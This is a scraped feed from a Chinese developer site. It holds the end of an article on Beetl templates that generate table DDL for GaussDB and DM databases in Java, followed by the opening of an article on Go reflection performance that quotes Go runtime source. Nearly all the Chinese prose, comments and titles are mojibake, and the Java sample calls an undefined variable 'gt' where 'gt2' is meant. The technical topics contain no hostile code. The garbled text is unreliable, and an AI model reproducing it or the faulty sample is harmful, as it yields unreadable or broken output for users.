    SYS_ID,        <span class="hljs-comment">// æ•°æ®åº“ID </span>
    NONE,          <span class="hljs-comment">// æ— é»˜è®¤å€¼</span>
    FIX_VALUE      <span class="hljs-comment">// æŒ‡å®šé»˜è®¤å€¼</span>
}
</code></pre>
<p>Main.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Main</span>().check();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span> {

        <span class="hljs-type">TableDefinition</span> <span class="hljs-variable">poc_project_baseinfo</span> <span class="hljs-operator">=</span> TableDefinition.builder()
                .name(<span class="hljs-string">"test_table"</span>)
                .database(<span class="hljs-string">"test_user"</span>)
                .comment(<span class="hljs-string">"æµ‹è¯•è¡¨"</span>)
                .column(ColumnDefinition.builder()
                .string()
                .name(<span class="hljs-string">"id"</span>)
                .length(<span class="hljs-number">50</span>)
                .comment(<span class="hljs-string">"ID"</span>)
                .build())
                .column(ColumnDefinition.builder()
                .string()
                .name(<span class="hljs-string">"project_name"</span>)
                .comment(<span class="hljs-string">"åç§°"</span>).build())
                .build();

        List&lt;TableDefinition&gt; tables = Arrays.asList(poc_project_baseinfo);
        
        <span class="hljs-comment">// ç¯‡å¹…é™åˆ¶ï¼Œè‡ªåŠ¨åŒ–éƒ¨åˆ†ä¸‹æ¬¡åˆ†äº«</span>
       
        <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt1</span> <span class="hljs-operator">=</span> getGroupTemplate(<span class="hljs-string">"gaussdb"</span>);

        <span class="hljs-type">Template</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> gt1.getTemplate(<span class="hljs-string">"beetl/base/create_table.btl"</span>);
        t1.binding(<span class="hljs-string">"tables"</span>, tables);
        <span class="hljs-type">String</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> t1.render();

        <span class="hljs-comment">// ä»…æ‰“å° create table ddl</span>
        System.out.println(r1);

        <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt2</span> <span class="hljs-operator">=</span> getGroupTemplate(<span class="hljs-string">"dm"</span>);

        <span class="hljs-type">Template</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> gt.getTemplate(<span class="hljs-string">"beetl/base/create_table.btl"</span>);
        t2.binding(<span class="hljs-string">"tables"</span>, tables);
        <span class="hljs-type">String</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> t2.render();
        <span class="hljs-comment">// ä»…æ‰“å° create table ddl</span>
        System.out.println(r2);
    }

    <span class="hljs-keyword">public</span> GroupTemplate <span class="hljs-title function_">getGroupTemplate</span><span class="hljs-params">(String database)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ClasspathResourceLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClasspathResourceLoader</span>();
            <span class="hljs-type">Configuration</span> <span class="hljs-variable">conf</span> <span class="hljs-operator">=</span> Configuration.defaultConfiguration();
            System.out.println(conf.getTagMap());
            <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupTemplate</span>(loader, conf);

            Map&lt;String, Object&gt; shareVars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            shareVars.put(<span class="hljs-string">"StringEnum"</span>, TypeEnum.STRING);
            shareVars.put(<span class="hljs-string">"NumberEnum"</span>, TypeEnum.NUMBER);
            shareVars.put(<span class="hljs-string">"ClobEnum"</span>, TypeEnum.CLOB);
            shareVars.put(<span class="hljs-string">"DateEnum"</span>, TypeEnum.DATE);
            shareVars.put(<span class="hljs-string">"CURRENT_DATE"</span>, DefaultEnum.CURRENT_DATE);
            shareVars.put(<span class="hljs-string">"SYS_ID"</span>, DefaultEnum.SYS_ID);
            shareVars.put(<span class="hljs-string">"NONE"</span>, DefaultEnum.NONE);
            shareVars.put(<span class="hljs-string">"FIX_VALUE"</span>, DefaultEnum.FIX_VALUE);
            shareVars.put(<span class="hljs-string">"database"</span>, database);

            gt.setSharedVars(shareVars);
            <span class="hljs-keyword">return</span> gt;
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        }
    }
}
</code></pre>
<h3 data-id="heading-13">beetlæ¨¡æ¿</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€beetl
    â”œâ”€base                           
        â”œâ”€add_column.btl
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â””â”€create_table.btl
    â”œâ”€gaussdb
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â”œâ”€create_column.btl
        â””â”€tablespace.btl
    â””â”€dm
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â”œâ”€create_column.btl
        â””â”€tablespace.btl
</code></pre>
<h4 data-id="heading-14">baseç›®å½•</h4>
<p>å®šä¹‰é€šç”¨è„šæœ¬æ ¼å¼ï¼Œå°†æ•°æ®åº“å·®å¼‚éƒ¨åˆ†äº¤ç”±å¯¹åº”æ•°æ®åº“ä¸‹çš„è„šæœ¬æ‰§è¡Œã€‚åˆ©ç”¨beetlä¸­çš„ <code>include</code> æ ‡ç­¾å®ç°ã€‚</p>
<p>base/check_ds.btl æ£€æŸ¥åŸºç¡€ç¯å¢ƒã€‚</p>
<p>å¯æ ¹æ®åŸºå»ºæƒ…å†µè‡ªå®šä¹‰ï¼Œå¦‚æ•°æ®åº“åã€ç”¨æˆ·åã€å¯¹åº”çš„tablespaceæ˜¯å¦å­˜åœ¨ç­‰ç­‰ã€‚</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨includeæ ‡ç­¾å°†ç”±å¯¹åº”æ•°æ®åº“å®ç°</span>
&lt;% include("../" + database + "/check_ds.btl"){} %&gt;
</code></pre>
<p>base/check_table_column.btl æ£€æŸ¥è¡¨å’Œåˆ—æ˜¯å¦å·²ç»å­˜åœ¨</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨includeæ ‡ç­¾å°†ç”±å¯¹åº”æ•°æ®åº“å®ç°</span>
&lt;% include("../" + database + "/check_table_column.btl"){} %&gt;
</code></pre>
<p>base/create_table.btl åŸºç¡€å»ºè¡¨è¯­å¥</p>
<pre><code class="hljs language-shell" lang="shell">&lt;%
for(table in tables) {
<span class="hljs-meta prompt_">%</span><span class="bash">&gt;</span>
create table ${table.database}.${table.tableName} (
    &lt;%
    for(column in table.columns) {
        var end ="";
        if(!columnLP.last){
            end = ",";
        }
        # åˆ—ä¿¡æ¯å·®å¼‚äº¤ç”±å„è‡ªæ•°æ®åº“çš„ create_column.btl æ¨¡æ¿å®ç°
        include("../" + database + "/create_column.btl",{column:column,end:end}){}
    }
    %&gt;
) &lt;% include("../" + database + "/tablespace.btl",{table:table}){} %&gt;;

COMMENT ON TABLE ${table.database}.${table.tableName} IS '${table.comment}';
    &lt;%
    for(column in table.columns) {
    %&gt;
COMMENT ON COLUMN ${table.database}.${table.tableName}.${column.name} IS '${column.comment}';
    &lt;%
    }
    %&gt;
&lt;%
}
<span class="hljs-meta prompt_">%</span><span class="bash">&gt;</span>
</code></pre>
<h4 data-id="heading-15">gaussDB ç›®å½•</h4>
<p>gaussdb/check_ds.btl</p>
<pre><code class="hljs language-shell" lang="shell">SELECT user FROM dual;test_user;check failed. user must be test_user
select spcname from pg_tablespace where spcname='test_user_ts';test_user_ts;check failed. cannot find tablespace test_user_ts
</code></pre>
<p>gaussdb/check_table_column.btl</p>
<pre><code class="hljs language-shell" lang="shell">select table_name,column_name from information_schema.columns where table_schema='test_user' and table_name in  (
&lt;% for(table in tables) {  %&gt;
    '${table.tableName}'&lt;% if(!tableLP.last) {%&gt;,&lt;% } %&gt;
&lt;% } %&gt;
)
</code></pre>
<p>gaussdb/create_column.btl</p>
<pre><code class="hljs language-shell" lang="shell">&lt;% if(column.type == StringEnum ){ %&gt;
    ${column.name}  VARCHAR2(${column.length}) &lt;% if(column.defaultValueEnum == FIX_VALUE){ %&gt;default '${column.defaultValue}'&lt;% } %&gt; &lt;% if(column.defaultValueEnum == SYS_ID){ %&gt;default sys_guid()&lt;% } %&gt; ${end}
&lt;% } else if (column.type == NumberEnum) { %&gt;
    ${column.name}  NUMBER(${column.precision},${column.scale}) &lt;% if(column.defaultValueEnum == FIX_VALUE){ %&gt;default ${column.defaultValue}&lt;% } %&gt; ${end}
&lt;% } else if (column.type == ClobEnum) { %&gt;
    ${column.name}  CLOB ${end}
&lt;% } else if (column.type == DateEnum) { %&gt;
    ${column.name}  DATE &lt;% if(column.defaultValueEnum == CURRENT_DATE){ %&gt;default sysdate&lt;% } %&gt; ${end}
&lt;% } %&gt;
</code></pre>
<p>gaussdb/tablespace.btl</p>
<pre><code class="hljs language-shell" lang="shell"> tablespace ${table.tablespace}
</code></pre>
<blockquote>
<p>å¦‚æœè§‰å¾—å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œè¯·ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€æ”¶è—ã€åŠ å…³æ³¨ï¼Œæ„Ÿè°¢æ‚¨çš„æ”¯æŒã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7600990891218747401</link>    <guid>https://juejin.cn/post/7600990891218747401</guid>    <pubDate>2026-01-30T14:06:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891218747401" data-draft-id="7600787795478151214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–"/> <meta itemprop="keywords" content="Go,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-30T14:06:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Fgaoxing"/> <meta itemprop="url" content="https://juejin.cn/user/1016425732902296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1016425732902296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Fgaoxing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:06:14.000Z" title="Fri Jan 30 2026 14:06:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.yt-blog.top%2F38912%2F" target="_blank" title="https://www.yt-blog.top/38912/" ref="nofollow noopener noreferrer">www.yt-blog.top/38912/</a></p>
</blockquote>
<p>åšGoå¼€å‘çš„ï¼Œè‚¯å®šå°‘ä¸äº†ç”¨åå°„â€”â€”è§£æTagã€æ‹¿å­—æ®µåç§»ã€è·å–ç±»å‹ä¿¡æ¯ï¼ŒORMã€åºåˆ—åŒ–ã€é…ç½®ç»‘å®šè¿™äº›åœ°æ–¹éƒ½è¦ç”¨åˆ°ã€‚</p>
<p>ä½†æ˜¯å®˜æ–¹çš„<code>reflect</code>åŒ…æ€§èƒ½çœŸçš„ä¸å¤ªè¡Œï¼Œè§£æä¸€ä¸ªå­—æ®µæˆ–Tagè¦èŠ±å‡ ååˆ°å‡ ç™¾ä¸‡çº³ç§’ï¼Œè°ƒå¾—å¤šäº†ï¼Œç›´æ¥æˆæ€§èƒ½ç“¶é¢ˆã€‚</p>
<p>å¾ˆå¤šäººåªçŸ¥é“ã€Œåå°„æ…¢ã€ï¼Œä½†ä¸çŸ¥é“æ…¢åœ¨å“ªã€‚å’±ä»¬ä»Šå¤©å°±ä»<code>runtime</code>å±‚é¢åˆ†æä¸€ä¸‹ï¼Œé¡ºä¾¿æä¸ªé›¶æ‹·è´çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆä»åº•å±‚è¯´èµ·</h2>
<p>è¦ææ¸…æ¥šåå°„çš„æ€§èƒ½é—®é¢˜ï¼Œå¾—å…ˆçŸ¥é“Goåº•å±‚æ˜¯æ€ä¹ˆå›äº‹ã€‚</p>
<p>ä»Go1.14å¼€å§‹ï¼Œ<code>runtime</code>é‡Œå‡ ä¸ªæ ¸å¿ƒç±»å‹çš„å†…å­˜å¸ƒå±€å°±æ²¡å˜è¿‡ã€‚è¿™æ˜¯ä¸ªå…³é”®ç‚¹ã€‚</p>
<p>Goçš„åå°„åŒ…å°±æ˜¯åŸºäº<code>runtime</code>å±‚çš„<code>abi</code>å®ç°çš„ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// TypeOf returns the reflection [Type] that represents the dynamic type of i.</span>

<span class="hljs-comment">// If i is a nil interface value, TypeOf returns nil.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TypeOf</span><span class="hljs-params">(i any)</span></span> Type {

<span class="hljs-keyword">return</span> toType(abi.TypeOf(i))

}

</code></pre>
<p>å…¶å®<code>reflect.Type</code>å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸Šé¢ä»£ç é‡Œçš„<code>toType()</code>æŠŠå®ƒè½¬æˆäº†<code>reflect.rtype</code>ã€‚</p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// rtype is the common implementation of most values.</span>

<span class="hljs-comment">// It is embedded in other struct types.</span>

<span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span> {

t abi.Type

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">toRType</span><span class="hljs-params">(t *abi.Type)</span></span> *rtype {

<span class="hljs-keyword">return</span> (*rtype)(unsafe.Pointer(t))

}

</code></pre>
<p>æ‰€ä»¥æœ€åæ‹¿åˆ°çš„æ˜¯ä¸ª<code>abi.Type</code>å®ä¾‹ï¼Œ<code>reflect.rtype</code>åªæ˜¯ç»™å®ƒåŒ…äº†ä¸€å±‚ï¼Œæä¾›ä¸ªå‹å¥½çš„æ¥å£ã€‚ä¹Ÿå¯ä»¥æ¢æˆåˆ«çš„ç±»å‹ä¸“ç”¨ç»“æ„ä½“ï¼Œä½†æœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹<code>abi.Type</code>çš„å°è£…ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Finternal%2Fabi%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/internal/abi/type.go" ref="nofollow noopener noreferrer">internal/abi/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// Type is the runtime representation of a Go type.</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">// Be careful about accessing this type at build time, as the version</span>

<span class="hljs-comment">// of this type in the compiler/linker may not have the same layout</span>

<span class="hljs-comment">// as the version in the target binary, due to pointer width</span>

<span class="hljs-comment">// differences and any experiments. Use cmd/compile/internal/rttype</span>

<span class="hljs-comment">// or the functions in compiletype.go to access this type instead.</span>

<span class="hljs-comment">// (<span class="hljs-doctag">TODO:</span> this admonition applies to every type in this package.</span>

<span class="hljs-comment">// Put it in some shared location?)</span>

<span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> {

Size_ <span class="hljs-type">uintptr</span>

PtrBytes <span class="hljs-type">uintptr</span> <span class="hljs-comment">// number of (prefix) bytes in the type that can contain pointers</span>

Hash <span class="hljs-type">uint32</span> <span class="hljs-comment">// hash of type; avoids computation in hash tables</span>

TFlag TFlag <span class="hljs-comment">// extra type information flags</span>

Align_ <span class="hljs-type">uint8</span> <span class="hljs-comment">// alignment of variable with this type</span>

FieldAlign_ <span class="hljs-type">uint8</span> <span class="hljs-comment">// alignment of struct field with this type</span>

Kind_ Kind <span class="hljs-comment">// enumeration for C</span>

<span class="hljs-comment">// function for comparing objects of this type</span>

<span class="hljs-comment">// (ptr to object A, ptr to object B) -&gt; ==?</span>

Equal <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(unsafe.Pointer, unsafe.Pointer)</span></span> <span class="hljs-type">bool</span>

<span class="hljs-comment">// GCData stores the GC type data for the garbage collector.</span>

<span class="hljs-comment">// Normally, GCData points to a bitmask that describes the</span>

<span class="hljs-comment">// ptr/nonptr fields of the type. The bitmask will have at</span>

<span class="hljs-comment">// least PtrBytes/ptrSize bits.</span>

<span class="hljs-comment">// If the TFlagGCMaskOnDemand bit is set, GCData is instead a</span>

<span class="hljs-comment">// **byte and the pointer to the bitmask is one dereference away.</span>

<span class="hljs-comment">// The runtime will build the bitmask if needed.</span>

<span class="hljs-comment">// (See runtime/type.go:getGCMask.)</span>

<span class="hljs-comment">// Note: multiple types may have the same value of GCData,</span>

<span class="hljs-comment">// including when TFlagGCMaskOnDemand is set. The types will, of course,</span>

<span class="hljs-comment">// have the same pointer layout (but not necessarily the same size).</span>

GCData *<span class="hljs-type">byte</span>

Str NameOff <span class="hljs-comment">// string form</span>

PtrToThis TypeOff <span class="hljs-comment">// type for pointer to this type, may be zero</span>

}

</code></pre>
<p>å½“ç„¶å®é™…ä¸Šç»“æ„ä½“æ•°æ®æ˜¯å¦‚ä¸Šç»“æ„ä½“çš„æ‰©å±•ï¼ŒåŒæ ·å®šä¹‰åœ¨ä¸€èµ·ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Finternal%2Fabi%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/internal/abi/type.go" ref="nofollow noopener noreferrer">internal/abi/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-keyword">type</span> StructField <span class="hljs-keyword">struct</span> {

Name Name <span class="hljs-comment">// name is always non-empty</span>

Typ *Type <span class="hljs-comment">// type of field</span>

Offset <span class="hljs-type">uintptr</span> <span class="hljs-comment">// byte offset of field</span>

}

  


<span class="hljs-keyword">type</span> StructType <span class="hljs-keyword">struct</span> {

Type

PkgPath Name

Fields []StructField

}

</code></pre>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œè¿™äº›åº•å±‚ç±»å‹é‡Œå­˜çš„ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ˜¯ç¼–è¯‘å™¨ç¼–è¯‘æ—¶å°±å†™è¿›ç¨‹åºçš„<strong>åªè¯»å†…å­˜åŒº</strong>äº†ï¼Œ<strong>åœ°å€å›ºå®šã€GCä¸å›æ”¶ã€è¿è¡Œæ—¶ä¸èƒ½æ”¹</strong>ã€‚è¿™ç»™ç›´æ¥æ“ä½œåº•å±‚å†…å­˜æä¾›äº†å®‰å…¨ä¿éšœã€‚</p>
<p>æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<strong>å›ºå®šåç§»é‡</strong>ç²¾ç¡®æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼Œä¸ç”¨å®Œæ•´è§£ææ•´ä¸ªåº•å±‚ç»“æ„ä½“ï¼Œåªè¦å®šä¹‰å‡ ä¸ªç©ºçš„é•œåƒç±»å‹æ¥åšç±»å‹æ ‡æ³¨å°±å¤Ÿäº†ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ€§èƒ½ç“¶é¢ˆåœ¨å“ªå„¿</h2>
<p><code>reflect.TypeOf()</code>åº•å±‚å°±æ˜¯åšä¸ªæŒ‡é’ˆè½¬æ¢ï¼Œä¸æ‹·è´ä¸è®¡ç®—ï¼ŒæŒºå¿«çš„ã€‚çœŸæ­£çš„æ€§èƒ½æŸè€—å‡ºåœ¨åé¢ä¸¤ä¸ªé˜¶æ®µï¼Œè€Œä¸”å› ä¸ºæ²¡ç¼“å­˜ï¼ŒæŸè€—è¢«æ”¾å¤§äº†å¥½å‡ å€ã€‚</p>
<h3 data-id="heading-2">2.1 Fieldæ–¹æ³•åšäº†æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</h3>
<p>è°ƒç”¨<code>reflect.Type.Field(i)</code>çš„æ—¶å€™ï¼Œ<code>rtype</code>ä¼šè¢«è½¬æˆ<code>*StructType</code>ï¼Œç„¶åä»<code>Fields</code>å­—æ®µé‡Œè¯»ç›®æ ‡å­—æ®µä¿¡æ¯ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// Struct field</span>

<span class="hljs-keyword">type</span> structField = abi.StructField <span class="hljs-comment">// æ³¨æ„ï¼šä½ å¹³æ—¶ç”¨çš„æ˜¯ reflect.structFieldï¼Œä¸æ˜¯reflect.StructField</span>

  


<span class="hljs-comment">// structType represents a struct type.</span>

<span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> {

abi.StructType

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *rtype)</span></span> Field(i <span class="hljs-type">int</span>) StructField {

<span class="hljs-keyword">if</span> t.Kind() != Struct {

<span class="hljs-built_in">panic</span>(<span class="hljs-string">"reflect: Field of non-struct type "</span> + t.String())

}

tt := (*structType)(unsafe.Pointer(t))

<span class="hljs-keyword">return</span> tt.Field(i)

}

  


<span class="hljs-comment">// Field returns the i'th struct field.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *structType)</span></span> Field(i <span class="hljs-type">int</span>) (f StructField) {

<span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">len</span>(t.Fields) {

<span class="hljs-built_in">panic</span>(<span class="hljs-string">"reflect: Field index out of bounds"</span>)

}

p := &amp;t.Fields[i]

f.Type = toType(p.Typ)

f.Name = p.Name.Name()

f.Anonymous = p.Embedded()

<span class="hljs-keyword">if</span> !p.Name.IsExported() {

f.PkgPath = t.PkgPath.Name()

}

<span class="hljs-keyword">if</span> tag := p.Name.Tag(); tag != <span class="hljs-string">""</span> {

f.Tag = StructTag(tag)

}

f.Offset = p.Offset

  


<span class="hljs-comment">// We can't safely use this optimization on js or wasi,</span>

<span class="hljs-comment">// which do not appear to support read-only data.</span>

